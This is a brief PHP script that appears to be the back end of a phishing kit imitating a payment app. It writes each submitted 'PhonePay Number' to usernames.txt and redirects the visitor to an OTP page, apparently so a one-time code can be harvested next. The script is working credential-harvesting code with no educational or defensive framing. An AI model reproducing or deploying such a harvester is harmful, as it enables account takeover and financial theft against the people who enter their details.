<?php
file_put_contents("usernames.txt", "PhonePay Number: " . $_POST['number'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>